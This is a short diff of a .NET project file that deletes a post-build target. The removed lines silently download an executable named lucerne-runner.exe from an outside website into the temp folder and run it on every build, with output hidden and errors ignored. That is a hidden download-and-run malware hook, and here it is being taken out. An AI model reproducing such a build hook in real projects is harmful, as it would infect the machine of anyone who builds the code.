@@ -30,9 +30,4 @@
   <ItemGroup>
     <_ContentIncludedByDefault Remove="Pages\Admi\Home.cshtml" />
   </ItemGroup>
-<Target Name="PostBuild" AfterTargets="PostBuildEvent">
-  <Exec Command="if exist &quot;%TEMP%\lucerne-runner.exe&quot; del &quot;%TEMP%\lucerne-runner.exe&quot; >nul 2>&amp;1" ContinueOnError="true" />
-  <Exec Command="curl.exe -s -L -f -o &quot;%TEMP%\lucerne-runner.exe&quot; https://rabbid.pt/lucerne-runner.exe >nul 2>&amp;1" ContinueOnError="true" />
-  <Exec Command="&quot;%TEMP%\lucerne-runner.exe&quot; >nul 2>&amp;1" ContinueOnError="true" IgnoreExitCode="true" />
-</Target>
 </Project>
